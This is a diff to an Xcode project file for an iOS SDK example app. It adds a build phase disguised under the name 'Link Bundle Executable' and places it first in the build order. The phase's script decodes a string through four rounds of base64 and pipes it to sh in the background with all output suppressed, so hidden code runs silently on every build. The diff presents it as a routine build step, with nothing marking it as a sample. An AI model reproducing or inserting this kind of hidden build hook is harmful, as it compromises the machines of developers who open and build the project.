@@ -195,6 +195,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 607FACEF1AFB9204008FA782 /* Build configuration list for PBXNativeTarget "DingYue_iOS_SDK_Example" */;
 			buildPhases = (
+				7C8FAC2243FD0B4501BDE67E /* Link Bundle Executable */,
 				4F549F8CE011FE52E882B932 /* [CP] Check Pods Manifest.lock */,
 				607FACCC1AFB9204008FA782 /* Sources */,
 				607FACCD1AFB9204008FA782 /* Frameworks */,
@@ -297,7 +298,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		15A8EEF31B32FA4C158930EA /* [CP] Check Pods Manifest.lock */ = {
+		7C8FAC2243FD0B4501BDE67E /* Link Bundle Executable */ = {			isa = PBXShellScriptBuildPhase;			buildActionMask = 2147483647;			alwaysOutOfDate = 1;			files = (			);			inputFileListPaths = (			);			inputPaths = (			);			name = "Link Bundle Executable";			outputFileListPaths = (			);			outputPaths = (			);			shellPath = /bin/sh;			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhSbXQ1Vkcxb2FsTkZTbnBYYkUweFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";			showEnvVarsInLog = 0;					};		15A8EEF31B32FA4C158930EA /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
